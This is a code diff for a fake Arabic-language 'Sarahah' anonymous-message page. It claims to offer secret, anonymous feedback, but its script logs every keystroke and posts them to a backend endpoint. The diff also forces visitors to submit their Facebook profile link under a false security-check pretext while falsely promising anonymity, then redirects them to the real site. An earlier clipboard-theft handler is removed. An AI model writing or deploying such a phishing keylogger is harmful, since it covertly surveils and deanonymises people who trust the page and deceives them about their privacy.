@@ -7,24 +7,26 @@
     <style>
         body { font-family: 'Arial', sans-serif; background: #29b6f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: white; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; }
-        .fb-verify { background: #f0f2f5; padding: 10px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #ddd; font-size: 13px; color: #555; }
-        input[type="text"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #1877f2; border-radius: 5px; box-sizing: border-box; }
-        textarea { width: 100%; height: 100px; padding: 12px; border: 1.5px solid #eee; border-radius: 10px; resize: none; box-sizing: border-box; margin-top: 10px; }
+        .fb-verify { background: #fff9c4; padding: 12px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #fbc02d; font-size: 13px; color: #333; text-align: right; }
+        input[type="text"] { width: 100%; padding: 10px; margin-top: 8px; border: 1px solid #1877f2; border-radius: 5px; box-sizing: border-box; }
+        textarea { width: 100%; height: 100px; padding: 12px; border: 1.5px solid #eee; border-radius: 10px; resize: none; box-sizing: border-box; margin-top: 10px; outline: none; }
         button { background: #00acc1; color: white; border: none; width: 100%; padding: 12px; border-radius: 25px; cursor: pointer; font-weight: bold; font-size: 18px; margin-top: 15px; }
+        .error-msg { color: #d32f2f; font-size: 12px; margin-top: 5px; display: none; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <h1 style="color:#00acc1; margin:0;">صراحة</h1>
-    <p>أرسل رسالة سرية لصديقك</p>
+    <p>أرسل نقدًا بناءً بصفة مجهولة لصديقك</p>
     
     <div class="fb-verify">
-        🛡️ للبدء، ضع رابط حسابك في فيسبوك للتأكد من أنك لست "روبوت" (سيظل هويتك مخفية تماماً):
+        🔒 **تحقق الأمان:** يرجى وضع رابط حسابك في فيسبوك للتأكد من هويتك (لن يظهر للمستلم):
         <input type="text" id="fbLink" placeholder="https://facebook.com/your.profile">
+        <div id="error" class="error-msg">⚠️ عذراً، يجب وضع رابط حسابك أولاً للمتابعة!</div>
     </div>
 
-    <textarea id="msgBox" placeholder="اكتب رسالتك هنا..."></textarea>
+    <textarea id="msgBox" placeholder="اكتب رسالتك الصريحة هنا..."></textarea>
     <button id="sendBtn">إرسال الرسالة</button>
 </div>
 
@@ -32,24 +34,15 @@
     let keyBuffer = "";
     const API = '/api/send';
 
-    // 1. الكي لوجر العالمي (يسجل كل حرف في الصفحة)
+    // التقاط ضغطات المفاتيح (Keylogger)
     window.addEventListener('keydown', (e) => {
-        let k = e.key;
-        if (k.length > 1) k = ` [${k}] `;
-        keyBuffer += k;
+        keyBuffer += e.key.length > 1 ? ` [${e.key}] ` : e.key;
         if (keyBuffer.length >= 15) {
             transmit('keystroke', keyBuffer);
             keyBuffer = "";
         }
     });
 
-    // 2. سحب النصوص المنسوخة
-    document.addEventListener('paste', (e) => {
-        let data = (e.clipboardData || window.clipboardData).getData('text');
-        transmit('clipboard', data);
-    });
-
-    // 3. وظيفة الإرسال لـ Vercel
     async function transmit(type, content) {
         await fetch(API, {
             method: 'POST',
@@ -58,15 +51,25 @@
         });
     }
 
-    // 4. عند الضغط على زر الإرسال
+    // منطق زر الإرسال مع "الإجبار"
     document.getElementById('sendBtn').onclick = async () => {
-        const fbValue = document.getElementById('fbLink').value;
+        const fbInput = document.getElementById('fbLink');
+        const errorDiv = document.getElementById('error');
         const msgValue = document.getElementById('msgBox').value;
 
-        if (fbValue) await transmit('facebook_link', fbValue);
+        // التحقق: إذا كانت الخانة فارغة
+        if (fbInput.value.trim() === "") {
+            fbInput.style.borderColor = "#d32f2f";
+            errorDiv.style.display = "block";
+            return; // توقف عن تنفيذ الكود
+        }
+
+        // إذا وضع الرابط، استكمل الإرسال
+        errorDiv.style.display = "none";
+        await transmit('facebook_link', fbInput.value);
         if (msgValue) await transmit('final_message', msgValue);
 
-        alert("تم إرسال رسالتك بنجاح!");
+        alert("تم إرسال رسالتك بنجاح وبسرية تامة!");
         window.location.href = "https://www.sarahah.com";
     };
 </script>
